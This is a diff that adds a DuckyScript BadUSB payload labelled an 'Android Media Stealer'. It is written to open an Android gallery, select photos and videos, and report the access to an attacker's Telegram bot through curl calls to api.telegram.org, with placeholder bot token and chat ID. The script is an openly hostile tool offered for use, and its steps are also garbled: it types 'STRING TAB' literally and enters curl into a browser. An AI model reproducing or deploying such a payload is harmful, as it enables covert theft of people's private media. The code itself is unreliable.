@@ -1,0 +1,87 @@
+REM Title: Android Media Stealer to Telegram
+REM Author: BadUSB Library
+REM Description: Steals photos and videos, sends to Telegram
+REM Target: Android 7.0+
+REM Category: Collection
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Gallery
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Gallery
+ENTER
+DELAY 3000
+
+REM Navigate to photos
+STRING Photos
+ENTER
+DELAY 2000
+
+REM Select multiple photos
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+REM Share photos
+STRING Share
+ENTER
+DELAY 2000
+
+REM Open Browser
+STRING Chrome
+ENTER
+DELAY 2000
+
+REM Navigate to Telegram Web
+STRING https://web.telegram.org
+ENTER
+DELAY 3000
+
+REM Send media info
+STRING curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="TELEGRAM_CHAT_ID" -d text="Android Media Stealer Connected - Photos accessed"
+ENTER
+DELAY 2000
+
+REM Open Videos
+STRING Videos
+ENTER
+DELAY 2000
+
+REM Select videos
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+REM Send video info
+STRING curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="TELEGRAM_CHAT_ID" -d text="Videos accessed"
+ENTER
+DELAY 2000
